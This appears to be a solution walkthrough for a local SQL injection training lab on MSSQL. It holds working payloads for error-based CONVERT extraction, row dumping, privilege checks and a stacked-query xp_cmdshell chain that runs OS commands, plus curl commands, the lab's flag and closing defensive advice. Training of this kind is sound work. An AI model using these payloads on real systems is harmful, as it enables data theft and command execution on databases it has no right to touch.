<h4>Overview</h4>
<p>
    A search feature connects to MSSQL with visible error messages. The injection uses
    <strong>CONVERT error-based extraction</strong> to leak data through type conversion errors.
    The lab also demonstrates the <code>xp_cmdshell</code> attack chain for OS command execution
    (requires sysadmin privileges).
</p>

<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>report<br>
        <span class="prompt">SQL: </span>SELECT id, title, description FROM documents WHERE title LIKE '%report%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Q3 Financial Report</strong><br>
        Quarterly earnings and revenue analysis for Q3 2026<br><br>
        <span class="prompt"># Verified via curl</span>
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>A single quote breaks the query and reveals verbose MSSQL error messages: our extraction channel.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''.</strong><br><br>
        <span class="prompt">Note: </span>Error messages displayed = error-based extraction is possible
    </div>
</div>

<h4>Step 3: Dump All Documents</h4>
<p>Use <code>OR 1=1</code> to bypass the WHERE filter and list all documents.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Dump All Rows</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' OR 1=1 -- -<br>
        <span class="prompt">SQL: </span>SELECT id, title, description FROM documents WHERE title LIKE '%' OR 1=1 -- -%'<br><br>
        <span class="prompt">Output (6 documents verified):</span><br>
        1. <strong>Q3 Financial Report</strong>: Quarterly earnings and revenue analysis for Q3 2026<br>
        2. <strong>Employee Handbook</strong>: Company policies, benefits, and code of conduct<br>
        3. <strong>Network Architecture</strong>: Internal network topology and security zones<br>
        4. <strong>Incident Response Plan</strong>: Procedures for handling security incidents<br>
        5. <strong>Server Inventory</strong>: List of all production and staging servers<br>
        6. <strong>Backup Procedures</strong>: Daily and weekly backup schedules and retention
    </div>
</div>

<h4>Step 4: Enumerate Database and Tables</h4>
<p>Use CONVERT error-based extraction: <code>CONVERT(INT, string_value)</code> fails and leaks the string in the error message.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Database Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Database name:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, DB_NAME()) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>sqli_arena_mssql_lab7</strong>' to data type int.<br><br>
        <span class="prompt">// All tables at once (STRING_AGG):</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT STRING_AGG(TABLE_NAME, ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>documents,flags,cmd_output</strong>' to data type int.<br><br>
        <span class="prompt">Found: </span>3 tables -- documents (search data), flags (target), cmd_output (for xp_cmdshell output capture)
    </div>
</div>

<h4>Step 5: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. CONVERT Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the varchar value '<strong>FLAG{ms_xp_cmd_sh3ll_rc3}</strong>' to data type int.
    </div>
</div>

<h4>Step 6: Check Privilege Level</h4>
<p>Before attempting xp_cmdshell, enumerate the database user and role membership.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Privilege Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// SYSTEM_USER (login name):</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, SYSTEM_USER) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>sqli_arena</strong>' to data type int.<br><br>
        <span class="prompt">// CURRENT_USER (database user):</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, CURRENT_USER) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>dbo</strong>' to data type int.<br><br>
        <span class="prompt">// Check sysadmin role (CASE trick to force string error):</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'YES_SYSADMIN' ELSE 'NOT_SYSADMIN' END)) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the varchar value '<strong>YES_SYSADMIN</strong>' to data type int.<br><br>
        <span class="prompt">// xp_cmdshell status (Linux MSSQL does not support xp_cmdshell):</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT CAST(value_in_use AS NVARCHAR) + ':xp_cmdshell' FROM sys.configurations WHERE name='xp_cmdshell')) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>0:xp_cmdshell</strong>' to data type int.<br><br>
        <span class="prompt">Result: </span>Login=sqli_arena, DB user=dbo, sysadmin=YES, xp_cmdshell=disabled (value_in_use=0 on Linux MSSQL)
    </div>
</div>

<h4>Step 7: Stacked Queries + xp_cmdshell Attack Chain</h4>
<p>
    MSSQL supports stacked queries (multiple statements separated by <code>;</code>).
    The user has sysadmin privileges, and stacked queries execute successfully.
    On Windows MSSQL, this enables full OS command execution via xp_cmdshell.
    On Linux MSSQL, xp_cmdshell is not supported, but the attack chain is shown conceptually:
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7: xp_cmdshell Attack Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Verify stacked queries work:</span><br>
        <span class="prompt">Input: </span>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; -- -<br>
        <span class="prompt">Output: </span>All 6 documents returned (no error -- stacked query executed and sp_configure ran silently!)<br><br>
        <span class="prompt">// Full xp_cmdshell attack chain (requires sysadmin):</span><br><br>
        <span class="prompt">Step A: </span>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; -- -<br>
        <span class="prompt">&nbsp;&nbsp;</span>(Enable advanced configuration options)<br><br>
        <span class="prompt">Step B: </span>'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -<br>
        <span class="prompt">&nbsp;&nbsp;</span>(Enable xp_cmdshell stored procedure)<br><br>
        <span class="prompt">Step C: </span>'; INSERT INTO cmd_output EXEC xp_cmdshell 'whoami'; -- -<br>
        <span class="prompt">&nbsp;&nbsp;</span>(Execute OS command and capture output in table)<br><br>
        <span class="prompt">Step D: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 line FROM cmd_output WHERE line IS NOT NULL)) -- -<br>
        <span class="prompt">&nbsp;&nbsp;</span>(Read command output via error-based extraction)<br>
        <span class="prompt">Expected: </span>Conversion failed ... 'nt service\mssqlserver'
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag from Step 5: <code>FLAG{ms_xp_cmd_sh3ll_rc3}</code>.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Extract flag (verified on Linux MSSQL):</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt"># Verified output: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_xp_cmd_sh3ll_rc3}' to data type int.</span><br><br>
        <span class="prompt">// Full xp_cmdshell chain (Windows MSSQL only -- not supported on Linux):</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -"<br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q='; INSERT INTO cmd_output EXEC xp_cmdshell 'whoami'; -- -"<br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 line FROM cmd_output WHERE line IS NOT NULL)) -- -"<br>
        <span class="prompt"># Note: xp_cmdshell stacked query runs without error but produces no OS output on Linux MSSQL</span>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>xp_cmdshell</code> is MSSQL's most dangerous feature.
    It allows OS command execution when the user has <strong>sysadmin</strong> role. The attack
    chain: (1) enable advanced options via <code>sp_configure</code>, (2) enable
    <code>xp_cmdshell</code>, (3) capture output in a table via <code>INSERT INTO...EXEC xp_cmdshell</code>,
    (4) read results with CONVERT error-based extraction. Even when the user is not sysadmin,
    CONVERT error-based extraction still leaks any data the user can SELECT. Defense: never run
    applications as <code>sa</code> or sysadmin, disable <code>xp_cmdshell</code> permanently,
    use parameterized queries, and restrict error message verbosity in production.
</div>
